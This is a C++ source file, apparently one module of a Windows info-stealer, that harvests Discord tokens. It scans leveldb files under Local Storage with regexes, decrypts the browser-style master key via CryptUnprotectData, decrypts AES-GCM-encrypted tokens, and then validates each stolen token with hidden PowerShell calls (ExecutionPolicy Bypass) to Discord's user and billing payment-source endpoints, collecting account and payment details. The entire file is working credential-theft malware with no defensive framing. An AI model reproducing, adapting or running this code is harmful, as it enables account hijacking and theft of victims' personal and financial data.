#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <iostream>
#include <windows.h>
#include <fstream>
#include <regex>
#include <filesystem>
#include <Wincrypt.h>
#include <winternl.h>

#include "config.h"
#include "utils.h"

#include "discord.h"

#include "../ext/nlohmann/json.hpp"
#include "../ext/sqlite3.h"

using json = nlohmann::json;

Discord::Discord(vs svPaths) noexcept
{
	if (!config::discord)
		return;

	for (auto path : svPaths)
	{
		vs tokens = this->GetTokens(path);
		DATA_BLOB key = this->GetKey(path);

		if (tokens.size() == 0)
			continue;

		for (auto token : tokens)
		{
			std::string decrypted = this->DecryptToken(token, key);

			if (decrypted.empty())
				continue;

			if (!utils::isASCII(decrypted))
				continue;

			//Do not validate token if duplicate
			if (utils::bCheckForDuplicate<std::string>(this->validTokens, decrypted))
				continue;
		
			this->validTokens.push_back(decrypted);

			std::string validated = this->ValidateToken(decrypted);

			if (validated.empty())
				continue;


			this->data.append("Token: " + decrypted + "\n" + validated + "\n");
		}
	}
}

vs Discord::GetTokens(std::string path) noexcept
{
	std::regex r(R"reg(dQw4w9WgXcQ:[^\"]*)reg");
	std::regex r2(R"reg([\w-]{24}\.[\w-]{6}\.[\w-]{25,110})reg");
	std::regex r3(R"reg(ken[^"]{0,32}"([A-z0-9._-]{30,150})")reg");
	std::smatch m;

	path += "Local Storage\\leveldb\\";

	vs retVal;
	
	if (std::filesystem::is_directory(path))
		for (auto x : std::filesystem::directory_iterator(path))
		{
			if (!x.exists() || !x.is_regular_file())
				continue;

			std::string filename = x.path().string();

			//only check log and ldb files
			if (std::string t(filename.begin() + filename.size() - 4, filename.end()); t != ".log" && t != ".ldb")
				continue;

			std::ifstream file(x.path().string(), std::ios::binary);
			std::streampos size;


			if (file)
			{
				file.seekg(0, std::ios::end);
				size = file.tellg();
				file.seekg(0, std::ios::beg);

				std::vector<char> fd(size);
				file.read(fd.data(), size);

				std::string data(fd.begin(), fd.end());

				file.close();

				if (std::regex_search(data, m, r))
				{
					retVal.push_back(m.str());
				}
				else if (std::regex_search(data, m, r2))
				{
					retVal.push_back(m.str());
				}
				else if (std::regex_search(data, m, r3))
				{
					retVal.push_back(m.str());
				}
			}
		}

	return retVal;
}

DATA_BLOB Discord::GetKey(std::string path) noexcept
{
	path += "\\Local State";
	std::ifstream file(path, std::ios::binary);
	DATA_BLOB DataVerify = { 0 };

	if (file)
	{
		file.seekg(0, std::ios::end);
		int size = file.tellg();
		file.seekg(0, std::ios::beg);

		std::vector<char> fd(size);
		file.read(fd.data(), size);

		auto jsonData = (std::string)json::parse(std::string(fd.begin(), fd.end()))["os_crypt"]["encrypted_key"];

		auto decoded = utils::base64_decode(jsonData);

		std::string keyTwemp(decoded.begin(), decoded.end());
		std::string key = keyTwemp.substr(5);

		DATA_BLOB inData = { 0 };
		LPWSTR pDescrOut = NULL;

		inData.cbData = key.length();
		inData.pbData = (BYTE*)key.c_str();

		file.close();

		if (CryptUnprotectData(&inData, NULL, NULL, NULL, NULL, 0, &DataVerify))
		{
			LocalFree(DataVerify.pbData);
			return DataVerify;
		}
	}

	return { 0 };
}

vs Discord::GetValidTokens() noexcept
{
	return this->validTokens;
}

std::string Discord::DecryptToken(std::string token, DATA_BLOB key) noexcept
{
	if (token.empty()) //Empty
		return { 0 };

	if (token.substr(0, 12) != "dQw4w9WgXcQ:") //Check for unencrypted tokens
		return token;

	if (key.cbData == 0) //If key wasnt found but is needed
		return { 0 };


	auto b = token.substr(12); // split at "dQw4w9WgXcQ:"
	auto c = utils::base64_decode(b);

	std::string iv(c.begin() + 3, c.begin() + 15);

	//fill up the last part of the byte array so that it reaches 256 bytes...
	//reason for this is that the BCryptDecrypt didn't want to work with chaining
	//unless the size was a multiple of 64 that we can divide by 2
	std::vector<BYTE> pl(c.begin() + 15, c.end());
	DWORD initialSize = pl.size();

	for (int i = pl.size(); i < 256; i++)
		pl.push_back(0x0);

	NTSTATUS status;

	BCRYPT_ALG_HANDLE				hAlg = NULL;
	BCRYPT_KEY_HANDLE				hKey = 0;
	BCRYPT_AUTH_TAG_LENGTHS_STRUCT	authTagLengths = { 0 };
	DWORD							dwBlockLen = 0;
	DWORD							dwTmpLen = 0;

	status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!BCRYPT_SUCCESS(status))
		goto EXIT;

	status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	if (!BCRYPT_SUCCESS(status))
		goto EXIT;

	status = BCryptGetProperty(hAlg, BCRYPT_AUTH_TAG_LENGTH, (BYTE*)&authTagLengths, sizeof(authTagLengths), &dwTmpLen, 0);
	if (!BCRYPT_SUCCESS(status))
		goto EXIT;

	status = BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH, (BYTE*)&dwBlockLen, sizeof(dwBlockLen), &dwTmpLen, 0);
	if (!BCRYPT_SUCCESS(status))
		goto EXIT;

	status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, NULL, key.pbData, key.cbData, 0);
	if (!BCRYPT_SUCCESS(status))
		goto EXIT;

	{
		std::vector<BYTE> macContext(authTagLengths.dwMaxLength);
		std::vector<BYTE> authTag(authTagLengths.dwMinLength);

		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
		BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
		authInfo.pbNonce = (BYTE*)iv.c_str();
		authInfo.cbNonce = iv.size();
		authInfo.pbTag = &authTag[0];
		authInfo.cbTag = authTag.size();
		authInfo.pbMacContext = &macContext[0];
		authInfo.cbMacContext = macContext.size();

		std::vector<BYTE> contextIV(dwBlockLen);

		authInfo.dwFlags = BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG;
		status = BCryptDecrypt
		(
			hKey,
			&pl[0], 128,
			&authInfo,
			&contextIV[0], contextIV.size(),
			&pl[0], 128,
			&dwTmpLen, 0
		);

		if (!BCRYPT_SUCCESS(status))
			goto EXIT;

		status = BCryptDecrypt
		(
			hKey,
			&pl[128], 128,
			&authInfo,
			&contextIV[0], contextIV.size(),
			&pl[128], 128,
			&dwTmpLen, 0
		);

	}

EXIT:
	if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
	if (hKey) BCryptDestroyKey(hKey);

	switch (status)
	{
	case 0x0:
		return std::string(pl.begin(), pl.begin() + (initialSize - 16));
	default:
		return { 0 };
	}
}

std::string Discord::ValidateToken(std::string token) noexcept
{
	std::string script = "powershell -ExecutionPolicy Bypass \"try{$Res=iwr -Uri 'https://discord.com/api/v9/users/@me' -Method 'GET' -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36'; 'Accept'='*/*'; 'Authorization'='";
	script.append(token);
	script.append("'}; if($?){ echo $Res.Content;}}catch{}\"");

	std::string script2 = "powershell -ExecutionPolicy Bypass \"try{$Res=iwr -Uri 'https://discord.com/api/v6/users/@me/billing/payment-sources' -Method 'GET' -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36'; 'Accept'='*/*'; 'Authorization'='";
	script2.append(token);
	script2.append("'}; if($?){ echo $Res.Content;}}catch{}\"");


	if (!utils::RunSubWorker(NULL, script.c_str()))
		return { 0 };

	//We don't care to check if this fails or not since the previous call passed.
	utils::RunSubWorker(NULL, script2.c_str());

	return utils::ReadPipeData();
}